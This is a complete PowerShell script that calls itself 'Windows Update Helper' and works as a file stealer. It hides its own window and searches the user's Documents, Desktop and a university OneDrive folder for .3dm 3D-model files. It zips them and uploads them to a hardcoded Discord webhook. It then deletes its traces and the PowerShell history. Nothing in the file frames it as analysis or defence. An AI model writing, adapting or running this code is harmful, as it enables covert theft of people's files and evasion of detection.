[Console]::BackgroundColor = "Black" 
[Console]::Title = "Windows Update Helper"
[Console]::SetWindowSize(1,1)
Clear-Host

# Webhook configuration
$webhookUrl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"

# File extensions to search for
$fileExtensions = @("*.3dm")

# Folders to search
$foldersToSearch = @(
    "$env:USERPROFILE\Documents", 
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

# Create temporary working directory
$tempDir = "$env:TEMP\WinUpdateTemp"
$zipPath = "$env:TEMP\3dmFiles.zip"
if (-not (Test-Path -Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

# Hide the window immediately
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}

# Function to send zip to Discord
function Send-ZipToDiscord {
    param (
        [string]$zipPath
    )
    
    try {
        $fileName = [System.IO.Path]::GetFileName($zipPath)
        $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
        
        # Create multipart form content
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $body = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/zip$LF",
            [System.Text.Encoding]::UTF8.GetString($fileBytes),
            "--$boundary",
            "Content-Disposition: form-data; name=`"content`"$LF",
            "Collected .3dm files from $env:COMPUTERNAME",
            "--$boundary--$LF"
        ) -join $LF

        # Send to Discord
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    }
    catch {
        # Silent error handling
    }
}

# Main collection process
try {
    $foundFiles = @()
    
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
            $foundFiles += $files
        }
    }

    if ($foundFiles.Count -gt 0) {
        # Copy files to temp directory
        foreach ($file in $foundFiles) {
            $tempFilePath = Join-Path -Path $tempDir -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $tempFilePath -Force -ErrorAction SilentlyContinue
        }
        
        # Create zip archive
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
        
        # Send zip to Discord
        Send-ZipToDiscord -zipPath $zipPath
    }
}
finally {
    # Clean up
    if (Test-Path $tempDir) {
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $zipPath) {
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    }
    
    # Clear PowerShell history
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
}
